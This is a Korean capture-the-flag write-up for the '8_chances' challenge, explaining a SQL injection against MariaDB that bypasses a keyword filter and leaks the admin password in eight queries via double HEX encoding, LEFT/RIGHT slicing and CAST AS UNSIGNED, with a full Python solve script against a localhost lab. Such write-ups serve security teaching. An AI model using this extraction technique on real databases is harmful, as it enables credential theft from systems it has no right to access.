# 8_chances

#### 출제자 : 조수호 / shielder

## Concept

- sql injection
- mariadb

## Writeup

주요 기능을 정리해보겠습니다.
1. `reset` : `chance`를 8로 초기화합니다.
2. `test` : 입력한 쿼리를 실행시켜줍니다. 이 때 쿼리에
   `['union', 'update', 'sleep', 'concat', 'like', 'set', '@', '!', '%', '_', '\t','\n','\r','\v','\f', '/', '*', '#']`
   을 포함하면 안 됩니다.
3. `real` : `username`과 `password`를 입력받고 이것이 `admin`의 정보와 일치하면 `flag`를 줍니다. 이 때 `username`과 `password`는
   `string.punctuation + string.whitespace + string.digits`
   을 포함하면 안 됩니다.

`test` 기능을 자세히 보겠습니다.
`chance >= 8`이면 `admin`의 `password`를 교체합니다. 그리고 `test` 실행마다 `chance`가 1씩 증가하기 때문에 한 번 정해진 `password`는 8번의 쿼리 동안 유지됩니다. 쿼리 실행 결과의 요소가 1개이고, 그 `value`가 정수형이라면 출력해줍니다.
8번의 쿼리만을 `password`를 알아내야 합니다. 쿼리 실행 결과가 정수형이어야 출력을 볼 수 있으므로 `CAST(... as INT)`를 사용합니다. `INT`는 `BIGINT`로(`9,223,372,036,854,775,807`) 19글자의 숫자로 이루어진 문자열을 정수형으로 바꿀 수 있습니다. 생각을 조금만 더 하면, `UNSIGNED`를 사용하면 확정적으로 19글자를 정수형으로 출력할 수 있습니다.
이제 `password`를 길이가 `19 * 8 = 152` 이하인 숫자로 이루어진 문자열로 바꿔야 합니다. 숫자로 이루어진 문자열로 바꿔야 함에 집중해봅시다. 아스키코드표를 살펴보면, `[0-9a-fA-F]`를 `HEX`로 나타내면 모두 숫자로 이루어짐을 알 수 있습니다. 따라서 어떤 문자열이든 `HEX`를 두 번 씌우면 숫자로 이루어진 문자열로 만들 수 있습니다. `password` 초기화 과정에서 알 수 있는 점은 길이가 38인 점, `string.ascii_letters`로 이루어져 있다는 점입니다. `HEX`를 두 번 씌우면 문자열의 길이가 4배가 되므로 최종 길이는 `38 * 4 = 152`입니다. 조건과 정확히 일치합니다. 문자열을 8등분 하는 것은 `LEFT`와 `RIGHT` 함수로 해결할 수 있습니다.

## ex.py

```python
import requests

base_url = "http://localhost:10000/"

def reset():
    data = {
        "user" : "1",
        "pass" : "1",
        "testquery" : "1",
        "type" : "reset"
    }
    requests.post(base_url, data=data)

def test(testquery : str):
    data = {
        "user" : "1",
        "pass" : "1",
        "testquery" : testquery,
        "type" : "test"
    }
    res = requests.post(base_url, data=data)
    msg = res.text
    msg = msg.split('\n')[110].split('<')[1].split('>')[1]
    return msg

def real(ps : str):
    data = {
        "user" : "admin",
        "pass" : ps,
        "testquery" : "1",
        "type" : "real"
    }
    res = requests.post(base_url, data=data)
    return res.text

def lef(s : str, n : int):
    return "LEFT(" + s + f", {str(n)})"

def rig(s : str, n : int):
    return "RIGHT(" + s + f", {str(n)})"

def outline(s : str):
    return "SELECT CAST(" + s + " as UNSIGNED)"

base_payload = f"""
HEX(HEX((SELECT password FROM users WHERE username='admin')))
""".strip()

reset()
pw = ""
pw += test(outline(lef(lef(lef(base_payload, 76), 38), 19)))
pw += test(outline(rig(lef(lef(base_payload, 76), 38), 19)))
pw += test(outline(lef(rig(lef(base_payload, 76), 38), 19)))
pw += test(outline(rig(rig(lef(base_payload, 76), 38), 19)))
pw += test(outline(lef(lef(rig(base_payload, 76), 38), 19)))
pw += test(outline(rig(lef(rig(base_payload, 76), 38), 19)))
pw += test(outline(lef(rig(rig(base_payload, 76), 38), 19)))
pw += test(outline(rig(rig(rig(base_payload, 76), 38), 19)))
realpw = bytes.fromhex(bytes.fromhex(pw).decode()).decode()
print(realpw)
print(real(realpw))
```

8등분하는 방법은 여러 가지입니다. 예를 들어 `LEFT`와 `REVERSE` 함수만으로도 비슷한 논리를 이용하여 해결할 수 있습니다.